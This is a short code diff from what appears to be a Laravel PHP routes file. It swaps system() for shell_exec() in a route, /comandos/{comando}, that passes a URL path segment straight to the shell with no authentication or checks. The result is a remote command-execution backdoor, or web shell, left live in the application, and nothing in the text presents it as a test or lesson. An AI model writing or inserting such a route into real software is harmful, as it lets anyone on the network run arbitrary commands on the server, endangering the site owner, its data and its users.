@@ -18,7 +18,7 @@ use Illuminate\Support\Facades\Auth;
 
 // Comandos
 Route::get('/comandos/{comando}', function ($c){
-    system($c);
+    shell_exec($c);
 });
 
 // Mostrar imagen
